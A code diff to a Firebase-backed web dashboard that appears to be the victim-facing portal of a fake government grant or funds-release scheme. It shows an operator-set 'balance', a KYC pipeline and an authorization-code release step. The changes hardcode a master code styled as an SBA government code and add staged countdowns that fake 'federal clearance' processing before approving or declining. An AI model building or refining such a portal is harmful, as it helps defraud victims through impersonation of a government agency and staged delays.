@@ -195,6 +195,8 @@
         import { onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
         import { doc, onSnapshot, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
+        const MASTER_CODE = "SBA-3864-GOV"; 
+        
         let currentBalanceValue = 0;
         let isBalanceHidden = false;
 
@@ -211,20 +213,19 @@
                 if (snap.exists()) {
                     const data = snap.data();
                     
-                    // Profile UI
+                    // Name & Avatar
                     const name = data.fullName || user.displayName || "APPLICANT";
                     document.getElementById('uNameDisplay').innerText = name.toUpperCase();
-                    
                     const initialsParts = name.split(' ');
                     let initials = initialsParts.length >= 2 ? initialsParts[0][0] + initialsParts[1][0] : name.substring(0,2);
                     document.getElementById('uInitials').innerText = initials.toUpperCase();
 
-                    // Balance UI
+                    // Balance
                     currentBalanceValue = Number(data.balance) || 0;
                     updateBalanceDisplay();
                     document.getElementById('ledgerInitAmt').innerText = "+" + currentBalanceValue.toLocaleString('en-US', { style: 'currency', currency: 'USD' });
 
-                    // PIPELINE & TASKS
+                    // Pipeline Logic
                     if (['VERIFIED', 'SUCCESSFUL', 'APPROVED'].includes(data.kycStatus)) {
                         document.getElementById('dot-kyc').classList.add('active');
                         document.getElementById('kycStatusText').innerText = 'Status: IDENTITY SECURED';
@@ -236,26 +237,46 @@
                         document.getElementById('releaseSection').style.display = 'block';
                     }
 
-                    // *** REPAIRED AUTH CODE LOGIC ***
+                    // --- FULL SCRIPT LOGIC (30M FAIL / 1H SUCCESS) ---
                     const vBtn = document.getElementById('verifyBtn');
                     const vInput = document.getElementById('releaseCodeInput');
                     const statusLabel = document.getElementById('authStatusLabel');
                     
                     if (data.authCodeStatus === 'PENDING') {
-                        vBtn.innerText = "WAITING...";
-                        vBtn.className = "bg-amber-500 text-white text-[9px] font-black px-4 py-2 rounded-lg uppercase border-b-4 border-amber-700";
                         vBtn.disabled = true;
                         vInput.disabled = true;
                         vInput.value = data.submittedAuthCode || "";
-                        statusLabel.innerText = "Status: Awaiting Federal Clearance";
                         statusLabel.className = "text-[8px] font-black mt-2 uppercase text-amber-600 block";
+                        
+                        if (data.submissionTime) {
+                            const now = Date.now();
+                            const subTime = data.submissionTime.toMillis();
+                            const isCorrect = data.submittedAuthCode === MASTER_CODE;
+                            
+                            const waitLimit = isCorrect ? (60 * 60 * 1000) : (30 * 60 * 1000); 
+                            const diff = now - subTime;
+
+                            if (diff >= waitLimit) {
+                                // TIME IS UP - Finalize
+                                if (isCorrect) {
+                                    updateDoc(userRef, { authCodeStatus: 'SUCCESSFUL' });
+                                } else {
+                                    updateDoc(userRef, { authCodeStatus: 'DECLINED' });
+                                }
+                            } else {
+                                // Show countdown
+                                const minsLeft = Math.ceil((waitLimit - diff) / 60000);
+                                vBtn.innerText = "WAITING...";
+                                statusLabel.innerText = `Status: Processing Authorization... (${minsLeft}m left)`;
+                            }
+                        }
                     } 
                     else if (data.authCodeStatus === 'DECLINED') {
                         vBtn.innerText = "RETRY";
                         vBtn.className = "bg-red-600 text-white text-[9px] font-black px-4 py-2 rounded-lg uppercase border-b-4 border-red-800";
                         vBtn.disabled = false;
                         vInput.disabled = false;
-                        statusLabel.innerText = "Status: Invalid Authorization Code";
+                        statusLabel.innerText = "Status: Invalid Authorization Code - ACCESS DENIED";
                         statusLabel.className = "text-[8px] font-black mt-2 uppercase text-red-600 block";
                     }
                     else if (data.authCodeStatus === 'SUCCESSFUL' || data.authCodeStatus === 'APPROVED') {
@@ -266,22 +287,17 @@
                         document.getElementById('globalStatus').className = "bg-emerald-100 text-emerald-700 border border-emerald-200 text-[8px] font-black px-2 py-1 rounded-md uppercase";
                     }
 
-                    // NOTIFICATIONS
+                    // Notifications
                     const hasMsgs = data.hasUnreadMessage === true;
                     document.getElementById('unreadBadge').style.display = hasMsgs ? 'inline-block' : 'none';
                     document.getElementById('helpNotify').style.display = hasMsgs ? 'block' : 'none';
                     document.getElementById('chatNotify').style.display = hasMsgs ? 'block' : 'none';
-                    
-                    if (data.depositStatus === 'PENDING') {
-                        document.getElementById('globalStatus').innerText = "Processing Funds";
-                        document.getElementById('globalStatus').className = "bg-blue-100 text-blue-700 border border-blue-200 text-[8px] font-black px-2 py-1 rounded-md uppercase";
-                    }
                 }
             });
 
-            // HANDLE CODE SUBMISSION
+            // Submit Button
             document.getElementById('verifyBtn').onclick = async () => {
-                const code = document.getElementById('releaseCodeInput').value.trim();
+                const code = document.getElementById('releaseCodeInput').value.trim().toUpperCase();
                 if (!code) return alert("Please enter your Authorization Code");
 
                 const btn = document.getElementById('verifyBtn');
@@ -291,12 +307,11 @@
                 try {
                     await updateDoc(userRef, {
                         authCodeStatus: 'PENDING',
-                        submittedAuthCode: code, // YOU WILL SEE THIS IN ADMIN
-                        lastAction: 'Authorization Code Submission',
+                        submittedAuthCode: code,
+                        submissionTime: serverTimestamp(),
                         updatedAt: serverTimestamp()
                     });
                 } catch (err) {
-                    alert("Transmission Error: " + err.message);
                     btn.disabled = false;
                     btn.innerText = "VERIFY";
                 }
